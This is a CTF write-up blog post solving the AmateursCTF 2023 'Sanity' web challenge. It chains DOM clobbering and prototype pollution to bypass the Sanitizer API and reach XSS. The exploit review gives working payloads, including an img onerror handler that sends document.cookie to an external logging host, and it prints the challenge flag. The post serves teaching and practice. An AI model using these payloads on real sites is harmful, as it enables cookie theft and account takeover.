---
title: Writeup - Sanity (AmateursCTF 2023)
date: 2023-07-18 00:00:02
tags: 
- writeup
- web
- amateursctf2023
---

# AmateursCTF 2023 - Sanity
## Description
```markdown
check out this pastebin! its a great way to store pieces of your sanity between ctfs.

sanity.amt.rs

[sanes.ejs] [index.js]
```

## Writeup
This was probably my favorite web challenge, and required a 3-exploit chain to solve. You had to use DOM clobbering and prototype pollution in order to enable DOM-based XSS, which was used to exfiltrate the flag from the cookies of the admin bot. I'll go through the discovery and exploit process step-by-step below. 

First, let's analyze the source code that they provided us ([download link](/static/amactf-sanity/index.js.txt)):

```javascript
// a bunch of imports and setup stuff

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, `/index.html`));
});

app.post("/submit", (req, res) => {
  const id = nanoid();
  if (!req.body.title) return res.status(400).send("no title");
  if (req.body.title.length > 100)
    return res.status(400).send("title too long");
  if (!req.body.body) return res.status(400).send("no body");
  if (req.body.body.length > 2000) return res.status(400).send("body too long");

  sanes.set(id, req.body);

  res.send(id);
});

app.get("/:sane", (req, res) => {
  const sane = sanes.get(req.params.sane);
  if (!sane) return res.status(404).send("not found");

  res.render("sanes", {
    id: req.params.sane,
    title: encodeURIComponent(sane.title),
    body: encodeURIComponent(sane.body),
  });
});

app.get("/report/:sane", async (req, res) => {
  // send the admin bot to the URL specified with the flag stored in the admin cookie
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
```

Let's break down this source code. First thing to note is that there's an endpoint (`/report/:sane`) where sending a specific `sane` parameter will cause an admint bot to visit the page with the flag stored in the cookie. Whenever there's an admin bot, it's a client-side web exploitation challenge. In this case, the flag being stored in the cookie means we need to achieve XSS and create a payload where we send the cookie to a public endpoint that we control. So we know our end goal is XSS. 

There are 3 other endpoints. The root endpoint (`/`) will just return `index.html`, the `/submit` endpoint is used to *create* a new note, and the `/:sane` endpoint is used to access a note. The `/submit` endpoint has some simple logic in it, where it will validate the note title and body, then randomly create an ID called `sane` and return that ID to you. It's important to note that there is no HTML filtering done server-side, which is good for us and helps us get XSS. There's also length limits, but they're big enough that we don't have to worry about it. 

The last endpoint passes the ID, title, and body to the [`sanes.ejs` file](/static/amactf-sanity/sanes.ejs.txt), which is where a majority of the fun stuff is. I'm going to focus on this file for the rest of the writeup since nothing else really happens in the server file. 

### Client-Side Code
Here's the `.ejs` file:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <!-- boring stuff -->
    <title>sanity - <%= title %></title>
</head>

<body>
    <h1 id="title">
        <script>
            const sanitizer = new Sanitizer();
            document.getElementById("title").setHTML(decodeURIComponent(`<%- title %>`), { sanitizer });
        </script>
    </h1>
    <div id="paste">
        <script>
            class Debug {
                #sanitize;
                constructor(sanitize = true) {
                    this.#sanitize = sanitize
                }

                get sanitize() {
                    return this.#sanitize;
                }
            }

            async function loadBody() {
                let extension = null;
                if (window.debug?.extension) {
                    let res = await fetch(window.debug?.extension.toString());
                    extension = await res.json();
                }

                const debug = Object.assign(new Debug(true), extension ?? { report: true });
                let body = decodeURIComponent(`<%- body %>`);
                if (debug.report) {
                    const reportLink = document.createElement("a");
                    reportLink.innerHTML = `Report <%= id %>`;
                    reportLink.href = `report/<%= id %>`;
                    reportLink.style.marginTop = "1rem";
                    reportLink.style.display = "block"

                    document.body.appendChild(reportLink)
                }

                if (debug.sanitize) {
                    document.getElementById("paste").setHTML(body, { sanitizer })
                } else {
                    document.getElementById("paste").innerHTML = body
                }
            }

            loadBody();
        </script>
    </div>
</body>
</html>
```

What's important to note is that the EJS rendering engine will *automatically* escape user-provided input, which prevents reflected and stored XSS out of the gate. However, our setup is a little more complicated that allows us to get XSS anyway. There are 3 main JavaScript sections provided in this HTML - the `loadBody()` function, the `Debug` class, and a script that sets the title in the body. In addition, up in the `<title>` tag, the `title` variable is printed there, but since it's automatically escaped this doesn't mean anything for us. 

First I'll explain what's happening in the top script. A `Sanitizer()` object is initialized and passed in as an argument for the `setHTML()` function. The main argument in `setHTML()` is ```decodeURIComponent(`<%- title %>`)```, which will take the escaped `title` variable and UNescape it (note - NEVER put user-provided data inside a `<script>` tag). The `Sanitizer()` object was new to me, so I did a little research to see what it did. Before this CTF, if someone wanted to render user-provided HTML but remove all malicious code, they had to use an external library like [DOMPurify](https://github.com/cure53/DOMPurify). It looks like now there was a built-in alternative to this, which doesn't require any third-party libraries. 

Anyways, [Sanitizer()](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) is a fairly new web API that sanitizes input, returning safe HTML and removing unsafe/unknown HTML. As a side note, it's technically an "experimental" feature, and is only really supported in the latest Chromium browsers. I didn't see any research or quick notes about how to bypass this to achieve XSS, and based on what was below, I figured this wasn't the exploit point. What's important to take away this line is that <u>we can create whatever HTML we want, as long as it's not malicious</u>.

### Note Body
What's weird is how they decided to render the note body. The first part of the `loadBody()` function has an `if` statement where if a `debug` variable is set, it'll download JSON from a provided URL. Then, this JSON is used in an `Object.assign()` call with a new `Debug()` class to create a `debug` variable. What does all this do? Well, `Object.assign()` will take two objects and combine *all* the properties together to make a new, super object. Here's an example below:

<img src="/static/amactf-sanity/object_assign.png" width="400px">

If the `report` attribute of this `debug` variable is set, then a link is created to report the page to the admin bot with only a click. This section of code is not vulnerable since we can't control the `id` parameter. Also, interestingly enough, if the `debug.sanitize` attribute is set, then the same safe `setHTML()` function will be used. However, if it's NOT set or set to `False`, then the `innerHTML()` function will be used, and that function is NOT safe. Because of the `Debug` class defined above, the default value for `sanitize` is true. 

### Creating the Exploit Chain
Now that we've analyzed the code and how it flows, let's pull out the different vulnerabilities present and find a way to trigger XSS. First to note is that the `innerHTML()` seems to be the best way to render whatever HTML we want. However, in order for that to be set, we need `debug.sanitize` to be set. Since `debug` is created by combining attributes of a `Debug` class (which we don't control) and a random JSON object, if we can control that JSON object, we can get XSS. Now we will need to use prototype pollution in that JSON object to overwrite the default value returned by the `Debug` class. Something like `{"__proto__":{"sanitize":false}}` should do the trick.

How do we control the JSON object though? Here's the code for it:

```javascript
if (window.debug?.extension) {
    let res = await fetch(window.debug?.extension.toString());
    extension = await res.json();
}
```

We need to be able to ensure the `window.debug.extension` variable exists, and control the `toString()` value. We can do this through [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering#top). DOM clobbering sets variables by assigning specific `id` attributes to HTML elements. For example, you can set `window.debug` by running `window.debug = 1;` in JavaScript, or by creating an element like `<a id='debug'></a>`. How can we set the `extension` attribute though? ([HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering) has a great page on that) When you create 2 HTML elements with the same `id`, they're placed into an array, and the name of the second element will be the attribute name (super wack, I know). For example, `<a id="debug"></a><a id="debug" name="extension"></a>` will make `window.debug.extension` return as `True`. To control the `toString()` method, you just set the `href` attribute of the second element. 

In short, to set `window.debug.extension.toString()` to an arbitrary URL, you just put the following HTML elements on the page - `<a id="debug"></a><a id="debug" name="extension" href="https://domain.tld/path"></a>`. How can we put this on the page? We can use the title!! Since the `Sanitizer()` API only blocks malicious HTML, our snippet isn't marked as "malicious", so if we put that in the title field it will show up correctly. All we need to do now is host a JSON payload on some public webserver (I just used this website) and create our note!

## Exploit Chain Review
* Use the DOM clobbering payload `<a id="debug"></a><a id="debug" name="extension" href="https://justinapplegate.me/a"></a>` in the note title to set `window.debug.extension.toString()` to `https://justinapplegate.me/a`
* The webpage `https://justinapplegate.me/a` hosts a JSON payload `{"__proto__":{"sanitize":false}}` so that the new `debug` variable will have `sanitize` set to `False`.
* Because `debug.sanitize` is set to `False`, our note body will be rendered on the page using `innerHTML()`, allowing us to do XSS
* We can use a payload like `<img src=x onerror="fetch('https://asdfsafasdfs.requestcatcher.com/'+document.cookie)">` in the body so that the cookie is sent to a logging website for us to catch.

Set up the public webpage, create a note with the specified title and body, "report" the note to the admin bot, and wait on your logging website for the admin cookie/flag to come through!

**Flag:** `amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}`